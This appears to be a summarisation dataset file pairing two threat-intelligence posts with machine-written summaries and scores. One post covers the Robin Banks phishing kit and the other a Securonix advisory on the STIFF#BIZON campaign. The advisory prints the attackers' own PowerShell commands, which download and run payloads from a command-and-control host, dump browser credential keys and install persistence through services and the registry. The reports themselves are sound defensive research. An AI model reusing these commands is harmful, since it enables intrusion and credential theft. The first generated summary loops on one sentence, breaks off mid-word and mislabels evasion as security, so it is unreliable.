0.9573170731707317, 'f': 0.391521193754019};{'r': 0.3202247191011236, 'p': 0.9827586206896551, 'f': 0.4830508437503591}
https://www.ironnet.com/blog/robin-banks-a-new-phishing-as-a-service-platform;Robin Banks might be robbing your bank;Key points from our research:Robin Banks is a phishing-as-a-service (PhaaS) platform, first seen in March 2022, selling ready-made phishing kits to cyber criminals aiming to gain access to the financial information of individuals residing in the U.S., as well as the U.K., Canada, and Australia.In mid-June, IronNet researchers discovered a new large-scale campaign utilizing the Robin Banks platform to target victims via SMS and email, with the goal of accessing credentials and financial information pertaining to Citibank, in addition to Microsoft account credentials.The primary motivation for scammers using this kit appears to be financial, however, the kit does also ask victims for their Google and Microsoft credentials after they travel to the phishing landing page, indicating it could also be used by more advanced threat actors looking to gain initial access to corporate networks for ransomware or other post-intrusion activities.Initial Access Brokers (IABs), or criminal actors who sell network access through the form of stolen credentials or initial access tools, have become prolific in today's cyber threat landscape. One very popular tool sold for system access is a phishing kit, provided by phishing-as-a-service (PhaaS) platforms that supply the capabilities needed to carry out a successful attack.Generally, these kits include sets of files that are pre-packaged to contain all the code, graphics, and configuration files necessary to create a phishing page. This can include features like curated databases of targets or branded email templates, and they're often designed to be easily deployable and reusable. Thus, they provide a quick and easy way for threat actors of all skill levels to gain access to accounts and systems of interest.Robin Banks: a new PhaaS platform on the marketIronNet researchers have recently observed an active cyber crime syndicate launching a new PhaaS platform, selling phishing kits to cyber criminals who specialize in social engineering scams. Known as Robin Banks, this threat actor provides ready-made phishing kits primarily targeting U.S.-based financial companies, as well as numerous companies in the U.K., Canada, and Australia.Financial institutions advertised on the website include: Bank of America, Capital One, Citibank, Wells Fargo, and more. They also offer templates to phish Google, Microsoft, T-Mobile information, as well as international companies like Lloyds Bank of England, Netflix in Canada, and Commonwealth Bank in Australia.Based on network traffic analysis and open-source research by our analysts, Robin Banks has been using the IP 5.206.227[.]166 and/or has been active since at least August 2020. The scammer's newest platform, discussed in this blog, has been in operation since March or April 2022.Accessing the platformIn order for interested buyers to access the robinbanks[.]in website, they are required to create an account login with an email and password and to pay via Bitcoin. When entering the site, customers are faced with a well-organized dashboard, offering a sidebar with features to set up a new page, monitor current pages, add funds to the wallet, and more. This is where customers can also access numerous options to craft a custom phishing kit.Robin Banks dashboard & sidebarThe Robin Banks website has a more sophisticated yet user friendly webGUI than 16Shop and BulletProftLink -- two well-known phishing kits that are also notably more expensive than Robin Banks as well. Over the past few months, Robin Banks has gained many new customers and has been one of the few PhaaS platforms to consistently update templates.PricingSingle pages, which include any future updates and 24/7 support, run for $50/month on Robin Banks. For full access, which includes access to all pages as well as any future updates and 24/7 support, Robin Banks charges users $200/month.On average, a single kit deployed via a PhaaS provider can cost anywhere between $150-$300/month - sometimes more depending on the services offered.Robin Banks pricing pageCustomizing the phishing kitIn customizing a kit through Robin Banks, threat actors can choose from a myriad of brands to impersonate and target the customers of those brands. Customers have various customization options, such as whether to opt into blocking users based on user agent strings or to employ reCAPTCHA when bot activity is detected.Crafting a phishing page on the Robin Banks platformDeploying the phishing kitUpon accessing the initial access URL sent through a scam SMS or email, the victim will be presented with either the phishing page content or, if the system detects a potential bot, a separate landing page that requires the completion of a reCAPTCHA. This is to stop web scanners from automatically detecting phishing pages.Once the reCAPTCHA is completed (if required), the victim will then be redirected to the landing page hosting phishing content (landing page is consistently hosted at the domain root with the path /dfsajsk.php ). The content of the phishing page is hosted both locally to the unique instance and centrally via Robin Banks infrastructure.As the victim accesses the landing page, their browser is fingerprinted via their user agent string to render content based on their unique device type (mobile vs. desktop). When the victim moves to complete all the form-fields on the site, the domain will then POST all data to the Robin Banks API (hosted at Rbresults[.]pm / 185.61.137[.]142 ).POST request containing a sample of phished dataThe POST contains two unique tokens: one being the token used by the threat actor to interact with the API/management interface, and the second being the victim.By analyzing the network traffic, it is clear that the number of POSTs is dependent on the number of unique pages requesting data from the victim. In other words, each time the victim reaches another page requesting information - like their credit card data, CCV, SSN, etc. - a separate POST is created, possibly as a fail safe in case the victim decides to quit the form prior to finishing it.Once the POST data is sent to the API, it can be viewed in the threat actors' management interface, where they have the option of instantly sharing the data to their personal Telegram channel. Since the data is sent to the Robin Banks API and thus resides on its infrastructure, not only is the threat actor able to view stolen data, but also the administrators of Robin Banks as well.Case Study: Investigating an active phishing campaign utilizing Robin BanksIn mid-June 2022, IronNet researchers observed a large-scale campaign using the Robin Banks phishing kit, targeting victims via SMS and email. The goal behind this campaign was to access credentials and financial information pertaining to Citibank, in addition to Microsoft account credentials.Example of phishing attempt from this campaignBased on investigation of the threat actor, this campaign proved very successful. Numerous victims had account information sold via the dark web and various Telegram channels.Recently, IronNet researchers have observed this threat actor attempting to expand their campaign and increase its effectiveness. This includes purchasing additional phishing kits from Robin Banks - in addition to the kit they already have targeting Citi-Bank users - to target the customers of other companies. It also includes efforts to diversify their hosting platforms by utilizing a myriad of services such as AWS, Microsoft, DigitalOcean, Oracle, and Google, as well as Cloudflare services. And, aligning with a trend seen with other Robin Banks scammers, the threat actor behind this campaign was observed utilizing Dynamic DNS (DDNS) to diversify network traffic.Motivation of threat actors using the Robin Banks PhaaS platformThreat actors using this phishing kit tend to target the basic user, with the goal of making as much of a profit as possible. The primary motivation for using this kit appears to be financial, based on the kit's main functional purpose of stealing banking credentials and other financial information.Cyber criminals using the Robin Banks kit often post the monetary data of their victims on Telegram and other various websites, listing the hacked account balances of various victims. Some users even use Telegram to resell phishing kits they purchased from Robin Banks.Through analyzing open-source intelligence and various forensic artifacts, IronNet researchers were not only able to identify potential suspects behind the platform itself, but were also able to calculate the estimated amount of money threat actors have had access to using the Robin Banks PhaaS platform.We assess that through the various phishing campaigns utilizing Robin Banks kits, criminal actors have had access to a surplus of over $500,000 - an amount that is rising daily.Notably, the kit does also inquire users for their Google and Microsoft credentials after they travel to the phishing landing page, indicating it could also be used by more advanced threat actors looking to gain access to corporate networks for ransomware or other post-intrusion activities.How IronDefense defends against Robin BanksIronNet's network detection and response solution, IronDefense, includes Phishing HTTPS, Domain Analysis, and Credential Phishing behavioral analytics that protect against this kind of activity.Our IronDefense Phishing HTTPS analytic works to specifically identify communications with phishing domains that are employing targeted brand imitation via HTTPS, as well as flag any time a user appears to be interacting with a phishing link or submitting sensitive information to a suspicious external entity.Our Credential Phishing analytic identifies when account credentials are transmitted to external destinations via the HTTP protocol.Our Domain Analysis analytic also flags activity that could indicate phishing by evaluating outgoing communications from an internal host to a new or unusual domain.In addition, Threat Intelligence Rules (TIRs) have been created for all IOCs and deployed in all IronNet instances.IronDefense Phishing HTTPS detection of an active phishing page utilizing Robin BanksConclusionThe purpose of this research is to shed light on a previously unreported PhaaS platform that is being actively used by cyber criminals to attack users, steal account credentials, and more. With phishing being one of the most used tactics by threat actors to gain initial access, it is increasingly important to uncover and monitor PhaaS platforms, such as Robin Banks, that facilitate cyber attacks on a mass scale.Overall, Robin Banks is just one of many platforms selling phishing kits on the market right now. It is not more sophisticated or widely used than other PhaaS platforms, but it does stand out for the 24/7 assistance it provides to customers and its distinct dedication to pushing updates, fixing bugs, and adding features to its kits.Given the criminal operator's clear dedication to managing and improving the platform, we suspect the threat actor behind Robin Banks to change tactics or toolings as a result of this report. This could include attempts to modify attack infrastructure, alter the platform domain, change customer permissions, or add new phishing kit features as an effort to make them more evasive.IronNet Threat Research will be releasing a second blog on the Robin Banks platform in the near future, providing additional IOCs, data, and analysis from our researchers.Mitigations for phishing attacksIn order to protect yourself and your organization from falling victim to a phishing attempt, you must take a multi-pronged approach. This includes:Don't click on links sent through SMS and email, especially if asked to access your account or enter your credentials.Use a password manager to ensure the use of unique credentials across all accounts.Enable multi-factor authentication (MFA) for all accounts.Require phishing training for employees and other partners.Monitor and analyze network traffic to detect suspicious activity, such as is done by IronNet's IronDefense platform.Other MITRE ATT&CK? mitigations for phishing:M1049 Antivirus / AntimalwareM1031 Network Intrusion PreventionM1021 Restrict Web-Based ContentM1054 Use anti-spoofing and email authentication mechanisms (Software Configuration)M1017 User TrainingRelevant MITRE ATT&CK TTPs and IronNet CoverageID Tactic & Technique IronDefense Analytics Use T1566 Initial Access: Phishing Phishing HTTPSDomain AnalysisCredential Phishing Threat actors using the Robin Banks platform conduct phishing. IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website.IOCsAdmin Server: Content Hosting: 5.206.227[.]166 Robinbanks[.]in Robinbnks[.]in robinbanks[.]cc Rbpages[.]nl Rbpagev2[.]in Rbresults[.]pm 185.61.137[.]142Network Threat Hunting;The ITSecurity report provides an overview of the PhaaS platform, Robin Banks, and its capabilities. The report discusses the platform's features, such as the ability to customize a phishing kit, deploy a phishing kit, and craft a phishing page. Additionally, the report discusses the platform's security measures, such as blocking users based on user agent strings and employing reCAPTCHA when bot activity is detected. IronNet Threat Research will be releasing a second blog on the Robin Banks platform in the near future, providing additional IOCs, data, and analysis from our researchers. IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website. Additionally, IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website. Additionally, IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website. Additionally, IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website. Additionally, IronNet's Phishing HTTPS analytic attempts to detect SNIs that may be associated with malicious links and fake web content, and IronNet's Domain Analysis analytic will fire on the newly created phishing website. Additionally, IronNet's Phishing HTTPS analytic attempts to detect SNIs that may;en;{'r': 0.09737827715355805, 'p': 0.8764044943820225, 'f': 0.17528089707640448};{'r': 0.04692260816575259, 'p': 0.6637931034482759, 'f': 0.08764940115718281};{'r': 0.09488139825218476, 'p': 0.8539325842696629, 'f': 0.17078651505393258}
https://www.securonix.com/blog/stiffbizon-detection-new-attack-campaign-observed/;Securonix Threat Labs Initial Coverage Advisory: STIFF#BIZON Detection Using Securonix – New Attack Campaign Observed Possibly Linked to Konni/APT37 (North Korea);"By Securonix Threat Labs, Threat Research: D. Iuzvyk, T. Peck, O. KolesnikovLast Updated: July 20, 2022IntroductionThe Securonix Threat Research (STR) team has been observing and investigating a new attack campaign exploiting high-value targets, including Czech Republic, Poland, and other countries. The attack campaign has been tracked by STR as STIFFBIZON.Based on the tradecraft and artifacts observed by the Threat Research team as part of this on-going campaign, some of the artifacts and tradecraft observed are known to be associated with Konni (APT37 in North Korea) malicious activity (see details below.)BackgroundKonni malware is classified as a RAT (remote access trojan) which was heavily used by APT37, contains built-in functions to elevate privileges and maintain persistence on the affected host. This particular malware was discovered in 2014 and has been attributed to the North Korean APT37 group[3].STIFFBIZON - Attack Chain: High Level OverviewThe initial infil part of the attack chain is relatively trivial and unremarkable. The infection starts through phishing emails, which attempt to lure the victim to open a malicious attachment. In this particular case the threat actors attached a file containing the malware.The overall attack chain can be seen in Figure 1 below:Figure 1STIFFBIZON: Stage 1 initial compromiseThe new Konni-based malware was embedded into a phishing document as a compressed file attachment. Inside the archive are the files ""missile.docx"" ""_weapons.doc.lnk""The initial compromise through malicious .lnk files is something we've seen with other loaders such as Bumblebee[9], and related DogWalk[10] phishing campaigns.The code execution begins by embedding small snippets of code into the shortcut file which will run and execute along with the intended binary when the user double clicks on it.Figure 2This code runs and executes Base64 encoded text appended to the end of the missile.docx file which can be seen in figure 3:Figure 3The Base64 payload is executed as another PowerShell stager which initiates C2 communication and downloads and runs both ""weapons.doc"" and ""wp.vbs"" files.Figure 4The final doc is then opened on the victim's computer as seen in the figure below. The second file that was downloaded from the script, wp.vbs silently runs in the background and sets stage 2 in motion with further code execution.Figure 5The lure document was allegedly created by ????? ??????? (Olga Bozheva) on Jun 16, 2022. The name and other metadata can be seen in figure 5. The alleged author is known to be a war correspondent in Russia (see figure 6.1)Figure 6Figure 6.1STIFFBIZON: Stage 2 loading the RATThe wp.vbs file which was downloaded and executed in the previous section does a couple of interesting things. As seen in figure 7 below, the malicious VBscript file creates a new scheduled task called ""Office Update"", . The scheduled task executes a PowerShell script encoded in Base64.Figure 7At this point C2 communications are once again established which provides the attacker access to the system.STIFFBIZON: C2 communicationOnce the attackers had access to the system, we observed the following activity and URL structures which give us more information.Download lure document: weapons.doc:/view.php?name=""+[Environment]::MachineName+""&tp=""+[Environment]::OSVersionDownload wp.vbs:/info.php?name=""+[Environment]::MachineName+""&tp=""+[Environment]::OSVersionRequest .NET assembly from C2 server that will be loaded into memory/dn.php?name='+[System.Environment]::MachineName+'&prefix=qq&tp='+[System.Environment]::OSVersionexample: [System.Reflection.Assembly]::Load($buf),$ep=$bin.EntryPoint,$ep.ToString(),$ep.Invoke($null,$null),STIFFBIZON: CapabilitiesTo help us understand the motivations behind the APT group and loaded malware we analyzed the following capabilities that were loaded into the victim machine.We observed following modules that were served by threat actor:Capture.net.exe which was used to create a screenshot using Win32 GDI API and upload the gzipped results to the C2 server. This can be seen in figures 8 and 9 below.Figure 8Figure 9The next module that was loaded is chkey.net.exe which was used to extract a state key which is stored in the Local State file. This state key is encrypted using DPAPI. With a state key, a threat actor (TA) can decrypt the cookie database offline and use this to import cookies into a machine controlled by the TA and access any available services without MFA authentication.Figure 10Figure 11Figure 12The next loaded module is pull.net.exe which we observed extracting saved logins, passwords, and URLs in the victim's browser ""Login Data"" file.Figure 13The next module, shell.net.exe was leveraged and provided the threat actor an ""interactive shell"" that would check and run commands from the attacker every 10 seconds. The loaded module can be seen in figures 14-16 below.Figure 14Figure 15Figure 16The module shell.net.exe provided the following C2 communication command structure:Receive commands from shell.net.exe assembly module (interactive shell):/dn.php?name=name=""+[Environment]::MachineName+""&prefix=kkTransfer tools/TA files to victim host:/dn.php?name=""+[Environment]::MachineName+""&prefix=mmSend results of commands execution (.net assembly modules)/up.php?name =""+[Environment]::MachineNameSTIFFBIZON: Modus Operandi:Operator activity often starts at ~ 1:00-7 a.m. UTC time.Operators transfer tools and other files from an external system into a compromised environment compressed in .cab archives.Commands executed are shell.net.exe .net assembly moduleInitial recon begins: cmd /c cd /d ""C:\Users"" && dir /a/o-d/s *.* cmd /c tasklist cmd /c systeminfo cmd /c wmic logicaldisk get caption,description,drivetype,filesystem,freespace,size,volumename cmd /c query sessionDump of browser state key (search for edge AES state key, master key) powershell -ep bypass -command ""$url='hxxp://547857[.]c1[.]biz/dn.php?name='+[System.Environment]::MachineName+' &prefix=mm',$client=new-object System.Net.WebClient,$rep=$client.DownloadString($url), $buf=[Convert]::FromBase64String($rep),$fn=[System.Environment]::GetEnvironmentVariable('temp')` +'\z.exe',[System.IO.File]::WriteAllBytes($fn, $buf),"" cmd /c cd /d %TEMP% && z.exe ""C:\Users\bhenson\AppData\Local\Microsoft\Edge\User Data\Local State"" cmd /c del /f /q ""%TEMP%\z.exe""Service installation for persistence powershell -ep bypass -command ""$url='hxxp://547857[.]c1[.]biz/dn.php?name='+[System.Environment]::MachineName +'&prefix=mm',$rep=(New-Object System.Net.WebClient).DownloadString($url), $buf=[Convert]::FromBase64String($rep),$fn='C:\Users\jalston\AppData\Local\Temp\1.cab', [System.IO.File]::WriteAllBytes($fn, $buf),"" cmd /c cd /d ""C:\Users\REDACTED\AppData\Local\Temp"" && dir /a/o-d/s *.* cmd /c expand %TEMP%\1.cab -f:* %TEMP% cmd /c cd /d ""C:\Users\REDACTED\AppData\Local\Temp"" && dir /a/o-d/s *.* cmd /c del /f /q ""C:\Users\REDACTED\1.cab"" cmd /c cd /d ""C:\Users\REDACTED\AppData\Local\Temp"" && dir /a/o-d/s *.* cmd /c cd /d ""C:\Users\REDACTED\AppData\Local\Temp"" && expand 1.cab -f:* %cd% cmd /c C:\Users\REDACTED\AppData\Local\Temp\food.bat cmd /c sc query wpcsvc cmd /c sc query wpcsvccmd /c rundll32 ""%TEMP%\wpnprv.dll"", IIIIIIII 4 ""cmd /c del /f /q C:\Windows\system32\wpcsvc.*"" cmd /c rundll32 ""%TEMP%\wpnprv.dll"", IIIIIIII 4 ""cmd /c del /f /q C:\Windows\system32\wnlsvc.*"" cmd /c tasklist /m wnlsvc.dllz.exeThis executable is used to dump chromium browser state keys. From Chromium 80+ cookies are encrypted using AES-256 GCM, with a state key which is stored in the Local State file. This state key is encrypted using DPAPI. With the state key, the threat actors are able to decrypt the cookie database offline and use cookies to access services without MFA.Note: The usage of the letter ""z"" in z.exe may further indicate Russian origins as ""z"" has been recently used as a Russian military symbol.Figure 17Figure 18STIFFBIZON: Stage 4 - AnalysisDuring this stage of the infection, the attacker has some control over the host and is able to download and execute commands. To further the persistence phase, a modified version of Konni malware appears to have been used.Attackers were able to download a .cab file containing several files related to the malware:batbatdlldatinidllLet's take a look at each of these files in execution order.food.batUsed to execute seed.bat from current user context or via user/domain credentials hardcoded in wpnprv.dll.Figure 19seed.batThis file contains commands that are used to replace the legitimate Windows service ""wpcsvc"" (Windows parental control service) with a malicious DLL wpcsvc.dll and encoded configuration files: wpcsvc.dat wpcsvc.iniFigure 20Wpnprv.dllThis is used as a proxy DLL with the EntryPoint function to ""IIIIIIII"" to execute commands depending on parameters:Example: cmd /c rundll32 ""C:\Users\username\AppData\Local\Temp\wpnprv.dll"", IIIIIIII 4 ""cmd /c del /f /q C:\Windows\system32\wpcsvc.dll""If the parameter is ""4"" will be executed sub_180002030In any other case will be executed sub_18001B70Figure 21If the parameter is set to ""4"" then this sample DLL will use anti-debugging techniques with API WaitForDebugEvent and ContinueDebugEvent to execute passed cmdline.Figure 22Figure 23If a parameter other than ""4"" is supplied to the sample dll, it will execute commands with higher privileges by running wusa.exe (a Windows Update Standalone Installer, located in the System32 folder), running as high-integrity process by default and spawn cmd.exe in high-integrity level. This technique was leaked in 2017 from WikiLeaks as part of ""Vault 7? material.The same implementation of this technique in PowerShell can be found in this entry. https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1This technique can be seen in figures 24 and 25:Figure 24Figure 25Wpcsvc.dll, wpcsvc.dat, wpcsvc.iniThese provide several functions but are primarily used for persistence by:Stopping wpcsvc Copying Wpcsvc.dll wpcsvc.dat wpcsvc to System32 folder Modifying/creating binpath,description and autostart service settings Adding service wpcsvc under SVCHOST.EXE context:reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v wpcsvc /t REG_MULTI_SZ /d ""wpcsvc"" /f > nulAnd specifying the malicious dll to be used with this service:reg add ""HKLM\SYSTEM\CurrentControlSet\Services\wpcsvc\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%windir%\System32\wpcsvc.dll"" /f > nulRestarting the service wpcsvcConclusion: Connecting the dotsAs shown above, the current attribution to APT37 is possible, but not 100% certain due to the dynamic nature of the artifacts and the shared opsec, tradecraft and malware variants observed. Additionally, there seems to be a direct correlation between IP addresses, hosting provider and hostnames between this attack and historical data we've previously seen from FancyBear/APT28[3]. In the end, what makes this particular case interesting is the usage of Konni malware in conjunction with tradecraft similarities to APT28.Speculation and false flagsCurrently, STIFFBIZON related activities are currently ongoing and something the Securonix Threat Research team is currently tracking. It is always important to consider the possibility of false flag operations where one APT group may be masquerading as another in order to avoid scrutiny. This is much more common with state-sponsored attacks.Securonix mitigations and recommendationsSecure credentials. Russian state-sponsored APT actors have demonstrated their ability to maintain persistence using compromised credentials [11] Use virtualization solutions on modern hardware and software to ensure credentials are securely stored. Disable the storage of clear text passwords in LSASS memory. Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication. Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). Minimize the Active Directory attack surface to reduce malicious ticket-granting activity. Malicious activity such as ""Kerberoasting"" takes advantage of Kerberos' TGS and can be used to obtain hashed credentials that attackers attempt to crack. Deploy PowerShell script block logging to assist in detections.Russian state-sponsored APT actors have demonstrated their ability to maintain persistence using compromised credentials When it comes to any type of malware, Securonix strongly recommends that AV definitions as well as operating systems are patched and up to date.Avoid opening any attachments especially from those that are unexpected or are from outside the organization. Consider blocking specific extensions such as .zip or .iso archives from being delivered to the recipient.Implement application and script execution policies that limit PowerShell and VBscript execution.Implement geo blocking policies on the firewall and blacklist unexpected countries.Securonix detection policiesSuspicious PowerShell Command From LOLbin Process AnalyticSuspicious Scheduled Task Creation Run From Public Dir AnalyticSuspicious wscript.exe Child Process Creation AnalyticSuspicious PowerShell In .lnk File Process Pattern AnalyticSuspicious Attempt To Access Browser Local State Folder CommandLine AnalyticFile And Directory Enumeration CommandLine AnalyticPotential System Binary Proxy Execution CommandLine AnalyticSuspicious Service Modification CommandLine AnalyticSuspicious Service Failure Action Modification CommandLine AnalyticAnd others.Hunting queries(rg_functionality = ""Next Generation Firewall"" OR rg_functionality = ""Web Application Firewall"" OR rg_functionality = ""Web Server"" OR rg_functionality = ""Web Proxy"") AND (requesturl CONTAINS ""info.php?name="" OR requesturl CONTAINS ""dn.php?name="" OR requesturl CONTAINS ""up.php?name="")rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND destinationprocessname ENDS WITH ""rundll32.exe"" AND resourcecustomfield1 CONTAINS "" iiiiiiii ""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND resourcecustomfield1 CONTAINS ""\AppData\Local\"" AND resourcecustomfield1 CONTAINS ""\User Data\Local State""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction ENDS WITH ""Written"" OR deviceaction = ""File created"") AND destinationprocessname ENDS WITH ""powershell.exe"" AND filepath CONTAINS ""\appdata\local\temp\rr"" AND filepath CONTAINS "".tar.gz""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND resourcecustomfield1 CONTAINS ""cd /d"" AND resourcecustomfield1 CONTAINS "" dir "" AND resourcecustomfield1 CONTAINS "" /a/o-d/s "" AND resourcecustomfield1 CONTAINS "" *.""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND destinationprocessname ENDS WITH ""expand.exe"" AND resourcecustomfield1 CONTAINS "".cab"" AND resourcecustomfield1 CONTAINS ""-f:"" AND sourceprocessname ENDS WITH ""cmd.exe""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND destinationprocessname ENDS WITH ""rundll32.exe"" AND resourcecustomfield1 CONTAINS ""cmd.exe"" AND resourcecustomfield1 CONTAINS ""/c""rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND destinationprocessname ENDS WITH ""reg.exe"" AND resourcecustomfield1 CONTAINS "" add "" AND resourcecustomfield1 CONTAINS ""console"" AND resourcecustomfield1 CONTAINS ""codepage"" AND resourcecustomfield1 CONTAINS ""65001""(rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"")) AND (destinationprocessname ENDS WITH ""reg.exe"" AND resourcecustomfield1 CONTAINS "" add "") AND ((resourcecustomfield1 CONTAINS ""system\currentcontrolset\services"" AND resourcecustomfield1 CONTAINS ""reg_expand_sz"") OR (resourcecustomfield1 CONTAINS ""software\microsoft\windows nt\currentversion\svchost"" AND resourcecustomfield1 CONTAINS ""reg_multi_sz""))rg_functionality = ""Endpoint Management Systems"" AND (deviceaction = ""Process Create"" OR deviceaction = ""ProcessCreate"" OR deviceaction = ""Process Create (rule: ProcessCreate)"" OR deviceaction = ""ProcessRollup2"" OR deviceaction = ""SyntheticProcessRollUp2"" OR deviceaction = ""WmiCreateProcess"" OR deviceaction = ""Trace Executed Process"" OR deviceaction = ""Process"" OR deviceaction = ""Childproc"" OR deviceaction = ""Procstart"" OR deviceaction = ""Process Activity: Launched"") AND destinationprocessname ENDS WITH ""sc.exe"" AND resourcecustomfield1 CONTAINS "" failure "" AND resourcecustomfield1 CONTAINS "" reset="" AND resourcecustomfield1 CONTAINS "" actions=""STIFFBIZON - MITRE ATT&CK techniquesTactic Technique Initial Access T1566.001 Spearphishing Attachment Execution T1059.001 PowerShell T1059.003 Windows Command Shell T1059.005 Visual Basic T1053.005 Scheduled Task T1569.002 Service Execution T1204.002 Malicious File Persistence T1543.003 Windows Service T1053.Scheduled Task Privilege Escalation T1134.001 Token Impersonation/Theft T1543.003 Windows Service Defense Evasion T1548.002 Bypass User Account Control T1134.001 Token Impersonation/Theft T1070.004 File Deletion T1027.005 Indicator Removal from Tools Credential Access T1555.003 Credentials from Web Browsers T1606.001 Web Cookies T1539 Steal Web Session Cookie Discovery T1082 System Information Discovery T1057 Process discovery T1007 System Service Discovery T1033 System Owner/User Discovery Collection T1560.003 Archive via Custom Method T1113 Screen Capture T1119 Automated Collection Command and Control T1071.001 Web Protocols T1132.001 Standard Encoding T1105 Ingress Tool Transfer Exfiltration T1020 Automated Exfiltrated T1041 Exfiltration Over C2 ChannelSTIFFBIZON - Indicators of compromiseHost Communication 185[.]176.43.106 547857[.]c1[.]biz 65487[.]c1[.]bizFile Name SHA256 (Dynamic/Custom implants) food.bat 07b10c5a772f6f3136eb58a7034bcb5ce71c0c740aaa528d3bae318d939b2242 seed.bat 5d28072d76bd6af944fcec8045cbc24410a58fe70eef6f83c50934245ec92e60 wpcsvc.dat b9727fb553894d857900c0a18f82723659d136329ef56bbe9388905a666f1197 wpcsvc.dll 12df9753abd867118ce97e6570c2bde780c7913ecab4b91ef7f540c4fede2772 wpcsvc.ini 6f325fb0a7de6f05490f1eb3c0e5826a44a11ed2dee4c17f486b8200f539d49e wpnprv.dll 35d38eed9168c16d2dd595fa9542a411080d12de971ea3d3c12dd5c44e454049 weapons.doc 31a9801e5e2e5fd7f66f23bc8456069b6a958e03838e431ccf7d84867f88c840 _weapons.doc.lnk 5fce9f27326549cc6091ba1f806e7c161878a2642411a941ba484b0c1c7adb8f wp.vbs 9f27430ed919e74c81b0487542fe29a65a0b860a6a290e3b032f3a5ba7c691bc z.exe b6987a717741329d5b64f769c9d3f1f572b42c7375dd841aecbf2b6d4096d6de capture.net.exe dee7826f5b7f0cbc97a81de8f6844a011cc836269bc5d00a0594dfec5386613c chkey.net.exe 44566d506e0348c999a66ee5158b0014a74bdd3f038e40ca76e5b069b8991f85 pull.net.exe 9c82477eac14abfb7f507806a941e4e5633dd07c4b73a44b10296ec28e3df162 shell.net.exe 5f3483823342318c4154bbef806cec2187a0360f079237a456603896ff7f5473References[1]: APT28: AT THE CENTER OF THE STORM, January, 2017 https://www.mandiant.com/sites/default/files/2021-09/APT28-Center-of-Storm-2017.pdf [2]: CrowdStrike's work with the Democratic National Committee: Setting the record straight, June 5, 2020 https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/ [3]: New variant of Konni malware used in campaign targeting Russia, August 23, 2021 https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/ [4]: 